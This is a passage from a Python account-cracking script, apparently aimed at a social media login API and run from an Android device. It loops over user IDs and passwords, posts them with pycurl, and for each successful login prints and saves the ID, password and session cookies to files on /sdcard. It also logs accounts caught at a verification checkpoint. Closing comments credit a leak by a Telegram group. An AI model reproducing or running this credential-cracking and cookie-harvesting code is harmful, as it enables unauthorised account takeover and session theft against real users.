            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                cookies = response_data.get("session_cookies")
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
                oks.append(ids)
                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[zar0-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/zar0-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass

os.system("clear")
Process()
    
    
#-----[ DEC & FUCKED BY - DARK LMNx9 ]-----
#-----[ Leaked - t.me/DARK_TEAM_LMNx9 ]-----
